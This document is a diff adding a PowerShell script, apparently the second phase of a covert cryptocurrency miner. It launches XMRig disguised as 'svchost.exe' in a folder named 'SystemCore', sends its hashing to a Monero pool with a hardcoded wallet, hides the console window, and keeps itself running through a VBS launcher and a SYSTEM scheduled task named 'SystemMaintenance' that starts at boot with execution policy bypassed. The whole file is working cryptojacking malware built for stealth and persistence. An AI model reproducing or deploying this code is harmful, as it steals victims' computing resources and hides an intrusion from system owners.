@@ -1,0 +1,144 @@
+param([switch]$AutoStart)
+
+# ===========================================
+# MINER SCRIPT - PHASE 2
+# Runs mining, sets up scheduled task, keeps everything hidden
+# ===========================================
+
+# ===========================================
+# CONFIGURATION VARIABLES - EDIT THESE
+# ===========================================
+
+# Mining Configuration
+$WalletAddress = "437kg8epTG59BpCHXSHVkiAx7S7oawgkeLjPyga1fX8Ca48wmWueu8uiovHZPT1oVGf4MEjvkhypMh3fvgb1cX69GKQwXMp"
+$PoolUrl = "pool.supportxmr.com:3333"
+$PoolPassword = "x"
+
+# Installation Directory (must match installer script)
+$InstallDirectory = "C:\ProgramData\MINEROPERATION"
+
+# Software Names (must match installer script)
+$XMRigFolderName = "SystemCore"
+$XMRigExecutableName = "svchost.exe"
+$MinerScriptName = "WinService.ps1"
+
+# Task/Service Names
+$ScheduledTaskName = "SystemMaintenance"
+
+# Log Files
+$MiningLogFile = "system.log"
+
+# ===========================================
+# MINER LOGIC - DON'T EDIT BELOW
+# ===========================================
+
+# Hide PowerShell console window completely
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+
+$consoleWindow = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consoleWindow, 0) | Out-Null
+
+function startMining {
+    $xmrigPath = Join-Path $InstallDirectory "$XMRigFolderName\$XMRigExecutableName"
+    
+    if (!(Test-Path $xmrigPath)) {
+        return $false
+    }
+    
+    $logPath = Join-Path $InstallDirectory $MiningLogFile
+    
+    try {
+        # Check if mining is already running
+        $existingProcess = Get-Process -Name $XMRigExecutableName.Replace('.exe', '') -ErrorAction SilentlyContinue
+        if ($existingProcess) {
+            return $true  # Already running
+        }
+        
+        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
+        $processInfo.FileName = $xmrigPath
+        $processInfo.Arguments = "-o $PoolUrl -u $WalletAddress -p $PoolPassword --log-file=$logPath"
+        $processInfo.UseShellExecute = $false
+        $processInfo.CreateNoWindow = $true
+        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        
+        [System.Diagnostics.Process]::Start($processInfo) | Out-Null
+        return $true
+    }
+    catch {
+        return $false
+    }
+}
+
+function createStartupTask {
+    try {
+        $minerScriptPath = Join-Path $InstallDirectory $MinerScriptName
+        
+        # Remove existing task if it exists
+        Unregister-ScheduledTask -TaskName $ScheduledTaskName -Confirm:$false -ErrorAction SilentlyContinue
+        
+        # Create VBS launcher for completely hidden execution
+        $taskVbsContent = @"
+CreateObject("Wscript.Shell").Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File ""$minerScriptPath"" -AutoStart",0,False
+"@
+        $taskVbsPath = Join-Path $InstallDirectory "task_launcher.vbs"
+        $taskVbsContent | Out-File -FilePath $taskVbsPath -Encoding ASCII
+        
+        # Create scheduled task
+        $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$taskVbsPath`""
+        $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -Seconds 30)
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+        
+        Register-ScheduledTask -TaskName $ScheduledTaskName -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" | Out-Null
+        
+        return $true
+    }
+    catch {
+        return $false
+    }
+}
+
+function stopMining {
+    try {
+        $processName = $XMRigExecutableName.Replace('.exe', '')
+        $processes = Get-Process -Name $processName -ErrorAction SilentlyContinue
+        foreach ($process in $processes) {
+            $process.Kill()
+        }
+        return $true
+    }
+    catch {
+        return $false
+    }
+}
+
+function getMiningStatus {
+    try {
+        $processName = $XMRigExecutableName.Replace('.exe', '')
+        $process = Get-Process -Name $processName -ErrorAction SilentlyContinue
+        if ($process) {
+            return "RUNNING - PID: $($process.Id)"
+        } else {
+            return "STOPPED"
+        }
+    }
+    catch {
+        return "ERROR"
+    }
+}
+
+# Main execution based on parameters
+if ($AutoStart) {
+    # Running from scheduled task - just start mining
+    startMining | Out-Null
+} else {
+    # First run - start mining and create scheduled task
+    if (startMining) {
+        createStartupTask | Out-Null
+    }
+}
